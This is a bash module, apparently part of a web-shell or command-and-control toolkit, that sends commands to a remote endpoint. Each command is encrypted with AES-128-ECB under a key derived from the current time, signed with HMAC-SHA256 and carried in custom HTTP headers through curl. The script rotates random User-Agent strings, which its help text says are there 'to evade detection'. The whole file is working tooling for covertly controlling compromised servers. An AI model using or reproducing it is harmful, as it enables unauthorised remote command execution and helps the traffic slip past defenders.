#!/usr/bin/env bash

# Shell module initializer
# - Expects a URL as the first positional parameter.
# - Accepts optional flags:
#   -u <user_agents_file>  : path to file with User-Agent strings (one per line)
#   -i <interval>          : synchronization interval (seconds) for time-based AES key
#   -k <hmac_key>          : HMAC secret key used to sign encrypted payloads
# The function validates inputs and loads user agents into USER_AGENTS array.
module_init() {
    URL="$1"

    # Ensure URL was provided
    if [[ -z "$URL" ]]; then
        echo "[!] shell_module_init: URL must be provided"
        return 1
    fi

    # Default configuration values
    UA_FILE="./resources/user_agents.txt"
    INTERVAL=60
    HMAC_KEY="secretkey"

    shift

    # Parse optional flags -u, -i, -k
    while getopts "u:i:k:" opt; do
        case $opt in
            u)
                UA_FILE="$OPTARG"
                ;;
            i)
                INTERVAL="$OPTARG"
                ;;
            k)
                HMAC_KEY="$OPTARG"
                ;;
            \?)
                echo "Unknown option: -$OPTARG" >&2
                return 1
                ;;
            :)
                echo "Missing value for -$OPTARG" >&2
                return 1
                ;;
        esac
    done

    # Verify the user-agent file exists
    if [[ ! -f "$UA_FILE" ]]; then
        echo -e "[!] UA file '$UA_FILE' not found."
        return 1
    fi

    # Load user agents into an array (one line == one UA)
    mapfile -t USER_AGENTS <"$UA_FILE"

    # Ensure we actually loaded something
    if [[ ${#USER_AGENTS[@]} -eq 0 ]]; then
        echo -e "[!] UA list is empty."
        return 1
    fi
}


# send_cmd: encrypts a command, computes HMAC and sends it over HTTP
# - Uses a time-synchronized AES-128-ECB key derived from the current UTC timestamp
# - AES key derivation: md5(timestamp_block) -> hex key for openssl -K
# - HMAC-SHA256 is computed over the base64 encrypted payload
# - A random User-Agent is chosen from the USER_AGENTS array for each request
# - The function expects the global variable URL to be set (module_init ensures this)
send_cmd() {
    local CMD="$1"

    # Compute synchronized timestamp block (rounded down to nearest INTERVAL)
    CURRENT_TS=$(date -u +%s)
    SYNC_TIME=$((CURRENT_TS / INTERVAL * INTERVAL))

    # Derive AES key (128-bit) as MD5 of the sync time (hex)
    AES_KEY_HEX=$(echo -n "$SYNC_TIME" | md5sum | awk '{print $1}')

    # Encrypt the command using openssl AES-128-ECB; output base64 single-line (-A)
    ENCRYPTED_CMD=$(echo -n "$CMD" | openssl enc -aes-128-ecb -K "$AES_KEY_HEX" -nosalt -base64 -A)

    # Compute HMAC-SHA256 over the encrypted payload using the configured HMAC key
    HMAC=$(printf '%s' "$ENCRYPTED_CMD" | openssl dgst -sha256 -hmac "$HMAC_KEY" | awk '{print $2}')

    # Pick a random User-Agent from the loaded list
    RANDOM_UA=${USER_AGENTS[$RANDOM % ${#USER_AGENTS[@]}]}

    # Send the encrypted command and HMAC as HTTP headers to the configured URL
    # - Uses curl in silent mode and sets the selected User-Agent
    curl -s -H "X-Cmd: $ENCRYPTED_CMD" -H "X-HMAC: $HMAC" -A "$RANDOM_UA" "$URL"
}


# Module main entrypoint (placeholder)
# Keep as-is: module_main may be used by the client to run module-specific logic
module_main() {
    :
}


# Description function used by module manager / UI
module_description() {
    echo "HTTP AES-128 command sender with HMAC verification and randomized User-Agent rotation."
}


# show_module_help: prints usage and description in English
# - Describes required and optional arguments and the behavior of the module
show_module_help() {
    cat <<EOF
Encrypted shell module
Usage: $0 <URL> [-u user_agents_file] [-i interval] [-k hmac_key]
Description:
  Sends encrypted commands over HTTP using AES-128-ECB with a time-based key.
  Each command is additionally protected with HMAC-SHA256.
  Random User-Agent strings are selected from the provided list to evade detection.

Arguments:
  URL                  Target endpoint URL
  -u user_agents_file  File containing User-Agent strings (default: ./resources/user_agents.txt)
  -i interval          Time interval (in seconds) for AES key synchronization (default: 60)
  -k hmac_key          HMAC secret key (default: secretkey)
EOF
}
